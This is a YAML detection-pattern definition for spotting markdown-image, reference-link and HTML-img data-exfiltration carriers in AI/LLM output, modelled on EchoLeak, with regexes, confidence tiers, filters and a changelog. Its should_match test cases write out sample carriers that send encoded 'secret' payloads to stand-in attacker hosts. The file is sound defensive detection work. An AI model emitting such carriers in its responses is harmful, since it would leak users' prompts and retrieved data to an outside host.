schema: testpattern/v1
name: AI Data-Exfiltration Marker
slug: ai-data-exfiltration-marker
version: 0.4.1
type: regex
pattern_class: identifier
engine: universal
description: >-
  Detects data-exfiltration carriers in AI/LLM output: markdown images or links and HTML img tags
  whose URL points off-tenant and carries an encoded data payload in the path or query. This is an
  EchoLeak-style (cf. CVE-2025-32711) generic markdown/HTML exfiltration-carrier marker - it flags the
  carrier shape, not the full CVE mechanism (which also involves XPIA evasion and a Teams proxy/CSP bypass).
operation: >-
  Three regexes: markdown image with external host + data-like query payload (>=16 chars),
  reference-style markdown link definition off-tenant, and an external <img src>. Corroborated by
  AI-context markers. Filters exclude allow-listed corporate hosts and obvious test text. Three tiers
  (65 regex only; 75 + AI context; 85 + AI context with corporate-host exclusion).
pattern: '!\[[^\]]*\]\(\s*https?://[^)\s]+[?#&][^)\s]*=[^)\s]{16,}\)'
confidence: high
confidence_justification: >-
  High/precision-gated: fires on outbound content, so tuned for low FP. Requires an external host plus
  a long encoded payload; corporate-host and test-text exclusions remove the named FP traps.
jurisdictions: [global]
regulations: ['OWASP LLM Top 10 2025', 'NIST AI RMF GenAI Profile']
frameworks: [ISO 27001]
data_categories: [emerging, security]
ai_threat:
  ai_sit_id: AI-SIT-013
  aic_alias: AIC-01
  threat_family: EnvironmentalTrap
  detection_approach: SIT
corroborative_evidence:
  keywords: [image, link, markdown, render]
  proximity: 300
  keyword_lists: [ai-context-markers]
purview:
  patterns_proximity: 300
  recommended_confidence: 85
  regexes:
    - id: Regex_md_image_exfil
      pattern: '!\[[^\]]*\]\(\s*https?://[^)\s]+[?#&][^)\s]*=[^)\s]{16,}\)'
    - id: Regex_md_reflink_exfil
      pattern: '\[[^\]]+\]:\s*https?://[^\s]+[?#&][^\s]*=[^\s]{16,}'
    - id: Regex_html_img_exfil
      pattern: '(?i)<img\s+[^>]*src\s*=\s*["'']?https?://[^"''>\s]+[?#&][^"''>\s]*=[^"''>\s]{16,}'
  shared_keywords:
    - dict: ai-context-markers
      as: Evidence_ai_context
      match_style: word
  pattern_tiers:
    - confidence_level: 85
      id_match: Regex_md_image_exfil
      matches:
        - ref: Evidence_ai_context
        - type: any
          min_matches: 0
          max_matches: 0
          children:
            - ref: Keyword_corporate_hosts
    - confidence_level: 75
      id_match: Regex_md_image_exfil
      matches:
        - ref: Evidence_ai_context
    - confidence_level: 65
      id_match: Regex_md_image_exfil
    - confidence_level: 65
      id_match: Regex_md_reflink_exfil
    - confidence_level: 65
      id_match: Regex_html_img_exfil
  keywords:
    - id: Keyword_corporate_hosts
      groups:
        - match_style: word
          terms: [sharepoint.com, teams.microsoft.com, office.com, office365.com]
      strength: specific
  filters:
    - id: Guard_exfil_exclude_test
      type: TextMatchFilter
      direction: Full
      logic: Exclude
      terms: ['https://example.com', 'data=PLACEHOLDER']
risk_rating: 7
risk_description: >-
  This high-confidence security detector flags an external markdown or HTML image/link carrier whose URL contains a long encoded payload in an AI context, indicating a possible EchoLeak-style exfiltration path rather than classifying the linked document. If rendered or followed, the carrier can transmit model-accessible data to an attacker-controlled host and expose secrets, prompts, or retrieved business content from the affected AI session. The event may affect one session or connected data boundary, while signed CDN URLs and security examples remain documented false positives unless host allow-list and AI context confirm the pattern. Risk 7 expresses material incident severity; the record classification is N/A because the carrier's payload, not the marker, determines any PSPF or QGISCF label.
sensitivity_labels:
  pspf: N/A
  qgiscf: N/A
  qgiscf_dlm: N/A
  us_gov: 'CUI Specified'
  uk_gov: 'OFFICIAL-SENSITIVE'
test_cases:
  should_match:
    - value: '![logo](https://evil.example.net/c?d=eyJzZWNyZXQiOiJsZWFrZWQtdmFsdWUtMTIzNDU2Nzg5In0)'
      description: Markdown image to external host with long base64-like query payload
    - value: '<img src="https://attacker.test/p?x=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo">'
      description: HTML img tag to external host with encoded payload
    - value: '[ref]: https://evil.example.net/c?d=eyJzZWNyZXQiOiJsZWFrZWQtdmFsdWUtMTIzNDU2Nzg5In0'
      description: Reference-style markdown link definition off-tenant with long encoded payload
  should_not_match:
    - value: '![logo](https://contoso.sharepoint.com/sites/team/logo.png)'
      description: SharePoint deep link (corporate host, no data payload)
    - value: '![pixel](https://analytics.example.com/t?id=42)'
      description: Analytics URL with short, non-data parameter
false_positives:
  - description: Legitimate markdown images or links to external CDNs or documentation hosts that carry long cache-busting or signed-URL query strings (e.g. AWS presigned URLs, CDN asset hashes) resembling encoded payloads.
    mitigation: Maintain an allow-list of trusted asset/CDN hosts (extend Keyword_corporate_hosts) and require AI-context corroboration before raising confidence; the 65 regex-only tier is advisory.
  - description: Security-research, training, or detection-engineering content that quotes EchoLeak-style exfiltration carriers verbatim as examples.
    mitigation: Exclude documents containing example/test markers (example.com, PLACEHOLDER) via the existing TextMatchFilter and gate on AI-context markers absent in prose discussion.
created: '2026-06-08'
updated: '2026-07-14'
changelog:
  - version: 0.4.1
    date: '2026-07-14'
    description: 'v23 reviewed risk assessment: apply the individually reviewed workbook outcome from row 1507 without changing detector or package metadata.'
  - version: 0.4.0
    date: '2026-07-09'
    description: 'C1 verdict-model: add pattern_class: identifier — classification-harness verdict class (concept patterns are scored as topic classifiers with decoy hits expected, not failed detectors; identifier/marking scoring unchanged); derived by scripts/derive-pattern-class.mjs + spot review'
  - version: 0.3.0
    date: '2026-07-04'
    description: 'Revert Task 5b weak-high downgrade: restore 5-tier structure (85/75/65x3) and confidence:high — the tier collapse had orphaned 2 of 3 attack-vector id_match regexes (md-reflink, html-img), and the demoted 85 tier had adequate independent evidence for a structural security pattern'
  - version: 0.2.0
    date: '2026-07-04'
    description: Downgraded weak high-confidence tier to 65 because independent specific/domain evidence was insufficient.; Downgraded weak medium-confidence tier to low because evidence was generic, structural, or absent.
author: testpattern-community
license: MIT
remediation:
  catalog_quality_2026_06_02:
    status: reverted
    changes:
      - 'Downgraded weak high-confidence tier to 65 because independent specific/domain evidence was insufficient.'
      - 'Downgraded weak medium-confidence tier to low because evidence was generic, structural, or absent.'
      - 'Collapsed 5 duplicate 65-confidence tier(s) into the strictest canonical tier.'
      - 'Aligned recommended_confidence to 65.'
    reverted_by: catalog_quality_2026_07_04_task6
    revert_reason: >-
      The "duplicate 65-confidence tier" collapse merged three tiers with three DIFFERENT id_match
      regexes (Regex_md_image_exfil, Regex_md_reflink_exfil, Regex_html_img_exfil covering the
      markdown-image, markdown-reflink, and HTML-img exfiltration carriers respectively) into a single
      tier keyed to Regex_md_image_exfil only, silently dropping Purview detection coverage for two of
      the pattern's three documented attack-vector regexes. Separately, the 85-tier (id_match plus
      Evidence_ai_context plus corporate-host exclusion) was demoted as "insufficient independent
      evidence," but this is a structural security-marker pattern, not a topic-phrase pattern: the base
      regex is already high-precision (external host + markdown-image syntax + 16+ char encoded query
      parameter), Evidence_ai_context draws from a dedicated domain dictionary, and the corporate-host
      exclusion removes the single most common benign case. The pattern's own confidence_justification
      ("tuned for low FP... exclusions remove the named FP traps") and false_positives note ("the 65
      regex-only tier is advisory") both argued for the original 5-tier/high-confidence design, which
      this revert restores in full.
